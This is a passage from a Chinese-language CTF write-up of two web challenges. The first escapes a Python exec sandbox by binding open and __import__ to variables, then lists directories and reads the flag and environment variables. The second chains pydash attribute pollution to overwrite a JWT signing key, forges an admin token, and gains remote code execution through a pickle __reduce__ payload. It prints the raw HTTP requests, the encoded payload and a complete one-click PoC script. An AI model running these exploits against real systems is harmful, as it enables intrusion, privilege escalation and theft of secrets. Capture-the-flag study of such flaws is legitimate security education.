    if len(code) > MAX_CODE_LEN:  
        return jsonify({'status': 'blocked', 'output': ''}) 
    return jsonify(run_sandbox(code))  
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=PORT, debug=False)
```
让ai代码审计一下：

结论其实就一句话：**黑名单只在源码文本和 AST 层面拦名字，真正执行的时候用的还是完整的 builtins。**

### 8.1 三层过滤各自在管什么

1. 正则层 `COMPILED_PATTERNS`：对原始字符串直接匹配，`open(`、`import os`、`__builtins__` 这类字面形式会被拦掉。它匹配的是"写法"，不是"行为"。

2. AST 层 `ASTFilter`：
   - `Import` / `ImportFrom` 一律拒绝；
   - `visit_Attribute` 拒绝危险属性名（`__class__`、`__globals__`，以及 `read`、`write`、`system` 这些方法名）；
   - `visit_Call` 只检查 `func` 是不是 `ast.Name`，且名字在黑名单里；
   - `visit_Subscript` 只检查字符串常量下标。

3. 执行层：

```python
sandbox = {'__builtins__': dict(SANDBOX_BUILTINS)}
```

而 `_sandbox_builtins()` 长这样：

```python
b = dict(builtins.__dict__)
b.pop('breakpoint', None)
b.pop('input', None)
```

只删了 `breakpoint` 和 `input`，`open`、`__import__`、`getattr`、`eval`、`exec`、`compile` 全都还在。所谓"沙箱"只是把整个 builtins 拷贝了一份，再在前面对着一份黑名单做语法检查。

这里有个容易忽略的点：`exec(code, sandbox)` 里查不到全局变量时会去 `sandbox['__builtins__']` 里找，所以 `open` 这种名字虽然没有显式定义，但依然可以直接拿来用——只要别写出 `open(` 这个形式。

顺带一提，开头那句 NFKC 归一化是想堵全角字符（`ｅｖａｌ`）的，而且归一化发生在正则检查之前，这条路走不通；不过下面的绕过根本用不上它。

### 8.2 绕过黑名单：先绑定，再调用

`visit_Call` 只拦"直接调用黑名单名字"，比如 `open(...)`。那如果把函数先赋给另一个变量呢：

```python
f = open
```

`open` 在这里只是读取一个 `Name`，不是调用；正则 `\bopen\s*\(` 也要求后面跟括号，这里没有。于是这句顺利通过。

接下来 `f('/app/flag.txt')` 的 `func` 是 `ast.Name(id='f')`，不在 `BANNED_FUNCTIONS` 里，也放行。

这个思路对 `__import__` 同样适用：

```python
i = __import__
o = i('os')
```

`__import__` 后面没有紧跟括号，正则不命中；AST 也只检查调用点，不检查名字本身。

### 8.3 `.read` 被禁了怎么办
拿到文件对象后，直觉是 `.read()`，但 `read` 在 `BANNED_METHODS` 里，`visit_Attribute` 会直接拒绝。
不过文件对象本身是可迭代的，逐行产出内容，所以根本不需要 `read`：
```python
print(*f('/app/flag.txt'))
```
`*` 把迭代出来的每一行作为独立参数传给 `print`，效果和打印全部内容一样。绕开的不只是 `read`，所有文件方法都碰不到。
### 8.4 起手先探路
一开始不知道 flag 放哪，先试 `/flag`：
```python
f = open
print(*f('/flag'))
```
返回：
```
FileNotFoundError: [Errno 2] No such file or directory: '/flag'
```
这里还有个意外收获，报错栈直接把路径带出来了：
```
File "/app/app.py", line 173, in _exec
```
说明程序跑在 `/app`。干脆把 `os` 摸出来看目录：
```python
i = __import__
o = i('os')
print(o.listdir('/'))
print(o.listdir('/app'))
```

```
['lib64', 'home', 'dev', 'srv', 'sbin', 'var', 'etc', 'mnt', 'lib', 'bin', 'root', 'run', 'proc', 'sys', 'opt', 'boot', 'tmp', 'usr', 'media', 'app']
['flag.txt', 'docker-entrypoint.sh', 'templates', 'app.py', 'requirements.txt']
```
flag 就在 `/app/flag.txt`。
### 8.5 读 flag
```python
f = open
print(*f('/app/flag.txt'))
```
响应：
```
0xGame{a503a96b-4751-467e-b560-abed3bcb32f4}
```
还有另一种方法，这里只提供获取flag的代码了
```python
b = print.__self__.__dict__
p = b['__imp' + 'ort__']('os').__dict__['pop' + 'en']
f = p('env')
print(''.join([x for x in f if 'FLAG' in x]))
```

## 9、pollute the key

给了一个app.py的源码，可以让ai代码审计一下
### 9.1 漏洞原理
#### 漏洞 1
这是一个pydash原型链污染（漏洞接口/api/user/update）
```python
data = request.get_json(silent=True) or {}
key = data.get("key")
value = data.get("value")
if not isinstance(key, str) or not key:
    return jsonify({"ok": False, "msg": "参数错误"}), 400

if "__builtins__" in key:
    return jsonify({"ok": False, "msg": "字段路径非法: 该路径被禁止修改"}), 400

username, role = me.username, me.role
try:
    pydash.set_(me, key, value)   # ← 漏洞点
except Exception as e:
    return jsonify({"ok": False, "msg": "字段路径非法: %s" % e}), 400
```

- `key` 完全由用户控制，直接传给 `pydash.set_`。
- `pydash.set_` 支持点号路径的属性链遍历，`me` 是 `User` 实例，路径可从实例走到类、再走到模块全局命名空间（`__init__.__globals__`）。
- 唯一过滤是 `"__builtins__" in key`，这个黑名单形同虚设，不含该子串的路径全部放行。
- 后面对 `me.username`、`me.role` 的还原只针对实例属性，挡不住对模块全局变量的污染。
#### 漏洞 2
```python
from runtime_secrets import SECRET_KEY, rotate_flag  
app = Flask(__name__, static_folder=None)  
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")  
@app.route("/static/<path:filename>", endpoint="static")  
def static_files(filename, _dir=STATIC_DIR):  
    return send_from_directory(_dir, filename)  
JWT_ALG = "HS256"  
JWT_TTL = 7200  
def _secret() -> str:  
    return SECRET_KEY
```

- `SECRET_KEY` 被导入为 `app.py` 模块的全局变量，而漏洞 1 的 `__init__.__globals__` 正好指向这个命名空间。
- `_secret()` 每次签名/验签都读这个全局变量，一旦被改写，攻击者即可用自己已知的 key 签发 JWT

#### 漏洞 3
JWT 签发与校验完全依赖被污染的密钥
```python
def jwt_encode(payload: dict) -> str:
    header = {"alg": JWT_ALG, "typ": "JWT"}
    segs = [
        _b64e(json.dumps(header, separators=(",", ":")).encode()),
        _b64e(json.dumps(payload, separators=(",", ":")).encode()),
    ]
    signing_input = ".".join(segs).encode()
    sig = hmac.new(_secret().encode(), signing_input, hashlib.sha256).digest()
    segs.append(_b64e(sig))
    return ".".join(segs)


def jwt_decode(token: str):
    try:
        h, p, s = token.split(".")
        if json.loads(_b64d(h)).get("alg") != JWT_ALG:
            return None
        expected = _b64e(
            hmac.new(
                _secret().encode(), ("%s.%s" % (h, p)).encode(), hashlib.sha256
            ).digest()
        )
        if not hmac.compare_digest(expected, s):
            return None
        payload = json.loads(_b64d(p))
        ...
        return payload
    except Exception:
        return None
```

- 签名和验签都调用 `_secret()`，而 `_secret()` 返回的 `SECRET_KEY` 可被漏洞 1 改写。
- 攻击者改掉密钥后，用同一算法自签 `role: admin` 的 payload，`jwt_decode` 会正常通过校验并返回该 payload。
- `current_user()` 直接信任 `jwt_decode` 的返回值：
```python
def current_user():
    token = request.cookies.get("token")
    return jwt_decode(token) if token else None
```
于是管理员身份校验 `payload.get("role") == "admin"` 被绕过。

#### 漏洞 4
pickle.loads 反序列化（漏洞接口/api/order/buy）
```python
raw = request.form.get("cart") or ""
if not raw:
    return jsonify({"ok": False, "msg": "缺少 cart 参数"}), 400
try:
    cart = pickle.loads(base64.b64decode(raw))   # ← 漏洞点
except Exception as e:
    return jsonify({"ok": False, "msg": "购物车数据无法解析: %s" % e}), 400
```

- 用户可控的 `cart` 经 Base64 解码后直接 `pickle.loads`，反序列化阶段即执行任意代码。
- 该接口前置校验 `payload.get("role") != "admin"`，而该 payload 来自漏洞 3 可伪造的 JWT，因此权限门槛被前面链条打通。
    
**前置权限校验代码**：
```python
payload = current_user()
if not payload:
    return jsonify({"ok": False, "msg": "请先登录"}), 401
if payload.get("role") != "admin":
    return jsonify({"ok": False, "msg": "下单结算仅对管理员（admin）开放"}), 403
```

### 9.2 攻击步骤
先注册一个账号（/api/register）
```
POST /api/register HTTP/1.1
Host: 5000-c219b213-dbac-4b7d-95b9-3e495c0f85b9.challenge.ctfplus.cn
Content-Type: application/json
Content-Length: 59

{"username":"123","password":"123123","email":"123@qq.com"}
```

```
{"msg":"注册成功，请登录","ok":true}
```

登录账号（/api/login）
```
POST /api/login HTTP/1.1
Host: 5000-c219b213-dbac-4b7d-95b9-3e495c0f85b9.challenge.ctfplus.cn
Content-Type: application/json
Content-Length: 38

{"username":"123","password":"123123"}
```

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkyMjQyMDk3LCJleHAiOjE3OTIyNDkyOTd9.Po9xX1H9NrIHG954nLDl4Jj3xH59jrG_TMW97Z9NMO4; Expires=Sat, 17 Oct 2026 15:01:37 GMT; Max-Age=7200; HttpOnly; Path=/; SameSite=Lax

{"msg":"登录成功","ok":true,"redirect":"/profile"}
```
登录的响应包里面给了token，接下来需要利用漏洞1，来构造key的paylaod
因为要从实例到类，所以 `__class__`；又因为要从类到函数对象，所以 `__init__`；又因为要从函数对象到它所属模块的全局命名空间，所以 `__globals__`；又因为目标密钥就在这个全局 dict 里，所以 `SECRET_KEY`。于是得到完整路径：`__class__.__init__.__globals__.SECRET_KEY`(顺序不能乱)，即`key=__class__.__init__.__globals__.SECRET_KEY`，然后我们需要利用
/api/user/update来把服务端的 JWT 签名密钥，换成一个自己知道的值。
```
POST /api/user/update HTTP/1.1
Host: 5000-c219b213-dbac-4b7d-95b9-3e495c0f85b9.challenge.ctfplus.cn
Content-Type: application/json
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkyMjQyMDk3LCJleHAiOjE3OTIyNDkyOTd9.Po9xX1H9NrIHG954nLDl4Jj3xH59jrG_TMW97Z9NMO4
Content-Length: 72

{"key":"__class__.__init__.__globals__.SECRET_KEY","value":"I_LOVE_YOU"}
```

```
{"msg":"资料已更新","ok":true,"profile":{"email":"123@qq.com","nickname":"","phone":"","role":"user","username":"123"}}
```

这样我们就把签名密钥改成我们自己知道的值了`I_LOVE_YOU`
接下来我们就可以用SECRET_KEY 伪造 admin token
打开burp的JWT编辑器
![](/images/20261017220843_9.png)
k的值是`I_LOVE_YOU`的base64url编码`SV9MT1ZFX1lPVQ==`，这样我们的前提工作就完成了，接下来我们验证一下admin身份
![](/images/20261017220843_10.png)
第一步先把user改成admin，再点击Sign，选择刚刚我们生成的密钥，最后确定好发送
```
GET /api/order/list HTTP/1.1
Host: 5000-c219b213-dbac-4b7d-95b9-3e495c0f85b9.challenge.ctfplus.cn
Content-Type: application/json
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MjI0MjA5NywiZXhwIjoxNzkyMjQ5Mjk3fQ.QtWUSeZZHA-4Roq6fQgx-qUaCNhV5e8WacEF6yLUcYs
Content-Length: 0
```

```
{"ok":true,"orders":[]}
```
说明我们已经成功成为了admin用户，接下来用 pickle 反序列化拿 flag
admin 身份到手后，回头看 `/api/order/buy` —— 它是唯一一个"admin 专属 + 危险操作"的接口：

```python
if payload.get("role") != "admin":
    return jsonify({"ok": False, "msg": "下单结算仅对管理员（admin）开放"}), 403

raw = request.form.get("cart") or ""
...
cart = pickle.loads(base64.b64decode(raw))   # ← 用户输入直接反序列化
```

`pickle.loads` 是 Python 里最危险的函数之一：它不是"解析数据"，而是"**按字节码执行**"，加载过程中可以调用任意函数。所以我们的目标就一句话 —— **造一段 pickle 字节，让它在加载时执行我们的命令**。

下面从零开始造，分五步，最后一步才会得到那串成品。
#### cart值的构造
##### 第一步：想清楚"加载时执行什么"
pickle 序列化对象时，会检查对象有没有 `__reduce__` 方法。这个方法返回"重建该对象所需的操作"，等 `loads()` 的时候**照着执行**。
利用点就是它：返回值写成 `(函数, (参数,))`，反序列化时就变成 `函数(参数)`。
```python
class RCE:
    def __reduce__(self):
        return (exec, (code,))     # 重建时 → exec(code)
```
`exec` 是 Python 内置函数（`builtins.exec`），pickle 只需要存"模块名 + 函数名"就能引用它，不用序列化代码本身。所以**构造恶意 pickle，本质就是写一个 `__reduce__`**。
##### 第二步：确定 `code` 里写什么
最直接的想法是让 exec 执行 `subprocess.check_output(['cat','/flag'])`。但它有个问题——**输出回不来**：
- 命令的输出进了**服务端的 stdout**，而 HTTP 响应里只会带 Flask 返回的 JSON
- 这就是"盲 RCE"：命令确实执行了，但你不知道结果
解法是把输出**塞进异常消息**。因为服务端这么处理：
```python
except Exception as e:
    return jsonify({"ok": False, "msg": "购物车数据无法解析: %s" % e}), 400
```
异常消息会被原样拼进 `msg` 字段。所以 `code` 写成：
```python
code = "raise Exception(__import__('subprocess').check_output(['sh','-c','cat /flag']).decode())"
```
- `__import__('subprocess')`：导入模块、执行命令
- `.decode()`：把 bytes 转成字符串（异常消息要文本）
- `raise Exception(...)`：把命令输出当异常抛出去 → 被 except 捕获 → 回显
##### 第三步：序列化成 pickle 字节
```python
import pickle
payload = pickle.dumps(RCE())
print(len(payload))       # 159
print(payload[:16].hex()) # 8004959400000000000000 8c08627569
```
`pickle.dumps()` 默认协议 4，产出的是一段**二进制**（开头 `80 04` 就是 PROTO 4 的标记）。
##### 第四步：base64 编码成文本
二进制没法直接塞进表单（`cart` 是 form 参数），base64 一下：
```python
import base64
b64 = base64.b64encode(payload).decode()
print(len(b64))   # 212
```
##### 第五步：URL 编码（关键小坑）
这一步最容易翻车：`application/x-www-form-urlencoded` 里，**`+` 会被解析成空格**。而 base64 的字符表里正好有 `+`。
这条载荷里就有一个 `+`（在 `IDI+L2Rldi` 那一段），如果不处理，服务端收到的是 `IDI L2Rldi`，base64 解码直接失败，或者解出错误字节。
所以要把 `+` 换成 `%2B`：
```python
final = b64.replace('+', '%2B')
print(len(final))   # 214
```

把上面五步的产物连起来看：

```
RCE() 对象
   │ ① 写 __reduce__ 返回 (exec, (code,))
   ▼
   │ ② code = "raise Exception(命令输出)"
   ▼
   │ ③ pickle.dumps()          → 159 字节二进制（80 04 ...）
   ▼
   │ ④ base64.b64encode()      → 212 字符
   ▼
   │ ⑤ + → %2B                 → 214 字符
   ▼
gASVlAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIx4cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ3N1YnByb2Nlc3MnKS5jaGVja19vdXRwdXQoWydzaCcsJy1jJywnY2F0IC9mbGFnIDI%2BL2Rldi9udWxsOyBlbnYgfCBncmVwIC1pIGZsYWcnXSkuZGVjb2RlKCkplIWUUpQu
```
这就是 `cart` 的值。
#### 最终：
```http
POST /api/order/buy HTTP/1.1
Host: 5000-c219b213-dbac-4b7d-95b9-3e495c0f85b9.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Cookie: token=<9.2 伪造出来的 admin token>
Content-Length: 219
Connection: close

cart=gASVlAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIx4cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ3N1YnByb2Nlc3MnKS5jaGVja19vdXRwdXQoWydzaCcsJy1jJywnY2F0IC9mbGFnIDI%2BL2Rldi9udWxsOyBlbnYgfCBncmVwIC1pIGZsYWcnXSkuZGVjb2RlKCkplIWUUpQu
```
响应（状态码是 400，但 msg 里就是命令输出）：
```json
{"msg":"\u8d2d\u7269\u8f66\u6570\u636e\u65e0\u6cd5\u89e3\u6790: 0xGame{097f3f90-9355-4b46-9e4b-dc96b78d325d}\nFLAG_INTERVAL=31536000\nFLAG=0xGame{097f3f90-9355-4b46-9e4b-dc96b78d325d}\n","ok":false}
```
### 9.3 一键poc

把下面脚本保存成 `poc.py`，改一下 `TARGET` 就能从"注册"一路打到"出 flag"：

```python
# -*- coding: utf-8 -*-
"""SimpleShop 一键 PoC：pydash 注入 -> 伪造 admin JWT -> pickle RCE"""
import base64, hashlib, hmac, json, pickle, re, time
import urllib.error, urllib.parse, urllib.request

TARGET = "http://5000-c219b213-dbac-4b7d-95b9-3e495c0f85b9.challenge.ctfplus.cn"  # 改这里
NEW_SECRET = "pwned_secret_2026"                 # 要写进服务端的新 JWT 密钥
CMD = "cat /flag 2>/dev/null; echo '---'; env | grep -i flag"

USER = "poc_%d" % int(time.time())
PASS = "p@ssw0rd123"


def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def jwt_encode(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    segs = [b64e(json.dumps(header, separators=(",", ":")).encode()),
            b64e(json.dumps(payload, separators=(",", ":")).encode())]
    sig = hmac.new(secret.encode(), ".".join(segs).encode(), hashlib.sha256).digest()
    return ".".join(segs) + "." + b64e(sig)


def make_cart(cmd):
    code = ("raise Exception(__import__('subprocess')"
            ".check_output(['sh','-c',%r]).decode())" % cmd)

    class RCE:
        def __reduce__(self):
            return (exec, (code,))

    return base64.b64encode(pickle.dumps(RCE())).decode()


def req(path, data=None, ctype=None, cookie=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if ctype:
        h["Content-Type"] = ctype
    if cookie:
        h["Cookie"] = cookie
    r = urllib.request.Request(TARGET + path, data=data, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


def post_json(path, obj, cookie=None):
    return req(path, json.dumps(obj).encode(), "application/json", cookie)


# 1. 注册 + 登录（拿普通用户 token）
print("[1] 注册:", post_json("/api/register",
      {"username": USER, "password": PASS, "email": "poc@test.local"})[1][:60])
st, body, hdrs = post_json("/api/login", {"username": USER, "password": PASS})
token = next(sc.split("token=", 1)[1].split(";", 1)[0]
             for sc in (hdrs.get_all("Set-Cookie") or []) if "token=" in sc)
print("[2] 登录成功，拿到普通用户 token")

# 2. pydash 注入：改 SECRET_KEY
st, body, _ = post_json("/api/user/update",
                        {"key": "__class__.__init__.__globals__.SECRET_KEY",
                         "value": NEW_SECRET},
                        cookie="token=" + token)
print("[3] 注入 SECRET_KEY ->", st)
assert st == 200, body

# 3. 伪造 admin JWT 并验证
now = int(time.time())
forged = jwt_encode({"username": USER, "role": "admin",
                     "iat": now, "exp": now + 7200}, NEW_SECRET)
print("[4] 伪造 admin JWT")
st, body, _ = req("/api/order/list", cookie="token=" + forged)
print("[5] admin 验证 ->", st, body.strip()[:40])

# 4. pickle RCE + 提取 flag
form = "cart=" + urllib.parse.quote(make_cart(CMD), safe="")
st, body, _ = req("/api/order/buy", form.encode(),
                  "application/x-www-form-urlencoded", "token=" + forged)
print("[6] pickle RCE ->", st)
msg = json.loads(body).get("msg", body)
print("-" * 50)
print(msg)
print("-" * 50)
m = re.search(r"0xGame\{[^}]+\}", msg)
print("[+] FLAG =", m.group(0) if m else "未匹配到")
```
